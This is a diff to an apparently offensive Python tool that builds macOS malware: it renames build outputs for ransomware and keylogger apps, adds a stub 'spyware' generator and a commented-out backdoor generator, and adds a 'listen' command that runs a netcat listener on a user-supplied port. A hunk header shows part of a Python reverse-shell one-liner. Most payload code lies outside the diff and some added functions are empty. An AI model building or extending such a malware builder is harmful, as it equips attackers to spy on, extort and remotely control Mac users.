@@ -138,7 +138,7 @@ func changebg() {
         os.system(idkbuild + gofilename)
         os.remove(gofilename)
         os.chdir("..")
-        os.system("mv sks/main ./MacRans.app")
+        os.system("mv sks/MacRans ./MacRans.app")
         print(Fore.GREEN + donestuff + Style.RESET_ALL)
         inputline()
     elif (platform.system() == "Windows"):
@@ -147,7 +147,7 @@ func changebg() {
             os.system(idkbuild + gofilename)
             os.remove(gofilename)
             os.chdir("..")
-            os.system("move sks\\main .\\MacRans.app")
+            os.system("move sks\\MacRans .\\MacRans.app")
             print(Fore.GREEN + donestuff + Style.RESET_ALL)
             inputline()
         elif (bugbypas == "n" or bugbypas == "N" or bugbypas == "no" or bugbypas == "No"):
@@ -284,7 +284,7 @@ func makepy2() {
         os.system(idkbuild + gofilename)
         os.remove(gofilename)
         os.chdir("..")
-        os.system("mv sks/main ./MacKeylog.app")
+        os.system("mv sks/MacKeylogger ./MacKeylog.app")
         print(Fore.GREEN + donestuff + Style.RESET_ALL)
         inputline()
     elif (platform.system() == "Windows"):
@@ -293,7 +293,7 @@ func makepy2() {
             os.system(idkbuild + gofilename)
             os.remove(gofilename)
             os.chdir("..")
-            os.system("move sks/main ./MacKeylog.app")
+            os.system("move sks/MacKeylogger ./MacKeylog.app")
             print(Fore.GREEN + donestuff + Style.RESET_ALL)
             inputline()
         elif (bugbypas == "n" or bugbypas == "N" or bugbypas == "no" or bugbypas == "No"):
@@ -314,6 +314,25 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
     print(Fore.GREEN + donestuff + Style.RESET_ALL)
     inputline()
 
+# Mac OS kernel infos https://gist.github.com/alexprivalov/70ada24de8e90e33ec57
+
+def spyware():
+
+	print(Fore.GREEN + generating + Style.RESET_ALL)
+	shfilename = "MacSpy.sh"
+	mainsh = open(shfilename, "w+")
+	mainsh.write('''#!/bin/bash''')
+	mainsh.close()
+	print(Fore.GREEN + donestuff + Style.RESET_ALL)
+	inputline()
+
+#def backdoor():
+#    scopeport = input(Fore.RED + "(MIS) On what port do you want to open a backdoor /> " + Style.RESET_ALL)
+#    scopassword = input(Fore.RED + "(MIS) Insert the password that will be set to access the backdoor /> ", Style.RESET_ALL)
+#    print(Fore.GREEN + generating + Style.RESET_ALL)
+#    gofilename = "RevShell.sh"
+#    maingo = open(gofilename, "w+")
+#    maingo.write('''#!/bin/bash''')
 
 def inputline():
     cmd = input(Fore.RED + "mAc_iS_sECuRe /> " + Style.RESET_ALL)
@@ -329,7 +348,13 @@ def inputline():
         keylogger()
     elif (cmd == "revshell" or cmd == "RevShell" or cmd == "Revshell" or cmd == "revShell"):
         revshell()
+    elif (cmd == "listen" or cmd == "Listen"):
+        listen()
 
+def listen():
+	ipporta = input(Fore.RED + "(MIS) Insert the port you want to listen on /> " + Style.RESET_ALL)
+	os.system("nc -lvnp " + ipporta)
+	inputline()
 
 def main():
     infos()
